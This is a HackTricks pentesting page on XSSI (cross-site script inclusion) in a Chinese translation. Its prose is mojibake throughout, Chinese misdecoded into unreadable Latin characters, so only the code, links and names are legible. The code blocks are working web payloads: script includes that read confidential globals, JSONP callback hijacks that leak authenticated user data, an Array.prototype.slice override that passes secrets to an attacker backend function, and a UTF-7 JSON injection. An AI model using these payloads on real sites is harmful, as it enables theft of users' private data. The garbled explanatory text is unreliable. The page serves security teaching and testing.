# XSSIï¼ˆè·¨ç«™è„šæœ¬åŒ…å«ï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

#### è¯¥ä¿¡æ¯æ¥æºäº[https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)

## åŸºæœ¬ä¿¡æ¯

XSSIæŒ‡çš„æ˜¯ä¸€ç§åˆ©ç”¨äº†ä»¥ä¸‹äº‹å®çš„æ¼æ´ï¼šå½“ä½¿ç”¨`script`æ ‡ç­¾åŒ…å«èµ„æºæ—¶ï¼ŒSOPï¼ˆåŒæºç­–ç•¥ï¼‰ä¸é€‚ç”¨ï¼Œå› ä¸ºè„šæœ¬å¿…é¡»èƒ½å¤Ÿè·¨åŸŸè¿›è¡ŒåŒ…å«ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä½¿ç”¨`script`æ ‡ç­¾è¯»å–æ‰€æœ‰è¢«åŒ…å«çš„å†…å®¹ã€‚

å½“æ¶‰åŠåˆ°åŠ¨æ€JavaScriptæˆ–JSONPæ—¶ï¼Œè¿™ä¸€ç‚¹å°¤å…¶æœ‰è¶£ï¼Œå› ä¸ºè¿™äº›æƒ…å†µä¸‹ä½¿ç”¨äº†æ‰€è°“çš„ç¯å¢ƒæƒé™ä¿¡æ¯ï¼Œå¦‚cookiesç”¨äºèº«ä»½éªŒè¯ã€‚å½“ä»ä¸åŒçš„ä¸»æœºè¯·æ±‚èµ„æºæ—¶ï¼Œè¿™äº›cookiesä¼šè¢«åŒ…å«è¿›æ¥ã€‚

### ç±»å‹

1. é™æ€JavaScriptï¼ˆå¸¸è§„XSSIï¼‰
2. åªæœ‰åœ¨èº«ä»½éªŒè¯åæ‰èƒ½è®¿é—®çš„é™æ€JavaScript
3. åŠ¨æ€JavaScript
4. éJavaScript

## å¸¸è§„XSSI

ç§äººä¿¡æ¯ä½äºå…¨å±€å¯è®¿é—®çš„JSæ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡è¯»å–æ–‡ä»¶ã€æœç´¢å…³é”®å­—æˆ–ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æ£€æµ‹åˆ°è¿™ä¸€ç‚¹ã€‚\
è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œåªéœ€åœ¨æ¶æ„å†…å®¹ä¸­åŒ…å«åŒ…å«ç§äººä¿¡æ¯çš„è„šæœ¬ï¼š
```markup
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
## åŠ¨æ€åŸºäºJavaScriptçš„XSSIå’Œç»è¿‡èº«ä»½éªŒè¯çš„JavaScript XSSI

å½“ç”¨æˆ·è¯·æ±‚è„šæœ¬æ—¶ï¼Œ**ä¼šæ·»åŠ æœºå¯†ä¿¡æ¯**ã€‚é€šè¿‡å‘é€è¯·æ±‚**å¸¦æœ‰å’Œä¸å¸¦æœ‰cookies**ï¼Œå¯ä»¥è½»æ¾å‘ç°è¿™ä¸€ç‚¹ï¼Œå¦‚æœæ£€ç´¢åˆ°**ä¸åŒçš„ä¿¡æ¯**ï¼Œåˆ™å¯èƒ½åŒ…å«æœºå¯†ä¿¡æ¯ã€‚è¦è‡ªåŠ¨æ‰§è¡Œæ­¤æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨Burpæ‰©å±•ï¼š[https://github.com/luh2/DetectDynamicJS](https://github.com/luh2/DetectDynamicJS)ã€‚

å¦‚æœä¿¡æ¯å­˜åœ¨äºå…¨å±€å˜é‡ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸å‰é¢æƒ…å†µç›¸åŒçš„ä»£ç æ¥åˆ©ç”¨å®ƒã€‚\
å¦‚æœæœºå¯†æ•°æ®åœ¨JSONPå“åº”ä¸­å‘é€ï¼Œæ‚¨å¯ä»¥è¦†ç›–æ‰§è¡Œçš„å‡½æ•°ä»¥æ£€ç´¢ä¿¡æ¯ï¼š
```markup
<script>
//The confidential info will be inside the callback to angular.callbacks._7: angular.callbacks._7({"status":STATUS,"body":{"demographics":{"email":......}}})
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```
æˆ–è€…ä½ ä¹Ÿå¯ä»¥è®¾ç½®ä¸€ä¸ªé¢„å…ˆå‡†å¤‡å¥½çš„å‡½æ•°æ¥æ‰§è¡ŒJSONPå“åº”ï¼š
```markup
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
å¦‚æœä¸€ä¸ªå˜é‡ä¸åœ¨å…¨å±€å‘½åç©ºé—´ä¸­ï¼Œæœ‰æ—¶ä»ç„¶å¯ä»¥åˆ©ç”¨_prototypeç¯¡æ”¹_æ¥è¿›è¡Œåˆ©ç”¨ã€‚åŸå‹ç¯¡æ”¹æ»¥ç”¨äº†JavaScriptçš„è®¾è®¡ï¼Œå³åœ¨è§£é‡Šä»£ç æ—¶ï¼ŒJavaScriptä¼šéå†åŸå‹é“¾ä»¥æ‰¾åˆ°è°ƒç”¨çš„å±æ€§ã€‚ä»¥ä¸‹ç¤ºä¾‹æ‘˜è‡ªè®ºæ–‡[åŠ¨æ€JavaScriptçš„æ„å¤–å±é™©](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf)ï¼Œæ¼”ç¤ºäº†å¦‚ä½•è¦†ç›–ç±»å‹ä¸º`Array`çš„ç›¸å…³å‡½æ•°å¹¶è®¿é—®`this`ï¼Œä»è€Œæ³„æ¼éå…¨å±€å˜é‡ã€‚
```javascript
(function(){
var arr = ["secret1", "secret2", "secret3"];
// intents to slice out first entry
var x = arr.slice(1);
...
})();
```
åœ¨åŸå§‹ä»£ç ä¸­ï¼Œç±»å‹ä¸º`Array`çš„`slice`è®¿é—®äº†æˆ‘ä»¬æ„Ÿå…´è¶£çš„æ•°æ®ã€‚æ­£å¦‚å‰é¢çš„éƒ¨åˆ†æ‰€æè¿°çš„ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–`slice`å¹¶çªƒå–ç§˜å¯†ä¿¡æ¯ã€‚
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
å®‰å…¨ç ”ç©¶å‘˜[Sebastian Lekies](https://twitter.com/slekies)æœ€è¿‘æ›´æ–°äº†ä»–çš„[æ”»å‡»å‘é‡åˆ—è¡¨](http://sebastian-lekies.de/leak/)ã€‚

## éè„šæœ¬XSSI

Takeshi Teradaåœ¨ä»–çš„è®ºæ–‡[åŸºäºæ ‡è¯†ç¬¦çš„XSSIæ”»å‡»](https://www.mbsd.jp/Whitepaper/xssi.pdf)ä¸­æè¿°äº†å¦ä¸€ç§ç±»å‹çš„XSSIã€‚ä»–èƒ½å¤Ÿé€šè¿‡åœ¨`script`æ ‡ç­¾ä¸­åŒ…å«CSVæ–‡ä»¶ä½œä¸ºæºæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨æ•°æ®ä½œä¸ºå˜é‡å’Œå‡½æ•°åæ¥æ³„éœ²è·¨æºçš„éè„šæœ¬æ–‡ä»¶ã€‚

ç¬¬ä¸€ä¸ªå…¬å¼€è®°å½•çš„XSSIæ”»å‡»å‘ç”Ÿåœ¨2006å¹´ã€‚Jeremiah Grossmançš„åšå®¢æ–‡ç« [ä½¿ç”¨GMailçš„é«˜çº§Webæ”»å‡»æŠ€æœ¯](http://jeremiahgrossman.blogspot.ch/2006/01/advanced-web-attack-techniques-using.html)æè¿°äº†ä¸€ç§XSSIæ”»å‡»ï¼Œé€šè¿‡è¦†ç›–`Array`æ„é€ å‡½æ•°ï¼Œèƒ½å¤Ÿè¯»å–Googleè´¦æˆ·çš„å®Œæ•´é€šè®¯å½•ã€‚

2007å¹´ï¼ŒJoe Walkerå‘è¡¨äº†[JSONå¹¶ä¸åƒäººä»¬æƒ³è±¡çš„é‚£æ ·å®‰å…¨](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/)ã€‚ä»–ä½¿ç”¨äº†ç›¸åŒçš„æ€è·¯æ¥çªƒå–åµŒå…¥åœ¨`Array`ä¸­çš„JSONæ•°æ®ã€‚

å…¶ä»–ç›¸å…³æ”»å‡»æ˜¯é€šè¿‡å°†UTF-7ç¼–ç çš„å†…å®¹æ³¨å…¥åˆ°JSONä¸­æ¥é€ƒé¿JSONæ ¼å¼ã€‚è¿™åœ¨Gareth Heyesçš„åšå®¢æ–‡ç« [JSONåŠ«æŒ](http://www.thespanner.co.uk/2011/05/30/json-hijacking/)ä¸­æœ‰æè¿°ï¼Œä»–æ˜¯[Hackvertor](https://hackvertor.co.uk/public)çš„ä½œè€…ã€‚åœ¨å¿«é€Ÿæµ‹è¯•ä¸­ï¼Œè¿™åœ¨Microsoft Internet Explorerå’ŒEdgeä¸­ä»ç„¶å¯è¡Œï¼Œä½†åœ¨Mozilla Firefoxå’ŒGoogle Chromeä¸­ä¸å¯è¡Œã€‚

å¸¦æœ‰UTF-7çš„JSONï¼š
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```
å°†JSONåŒ…å«åœ¨æ”»å‡»è€…çš„é¡µé¢ä¸­
```markup
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**æ¨ç‰¹**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
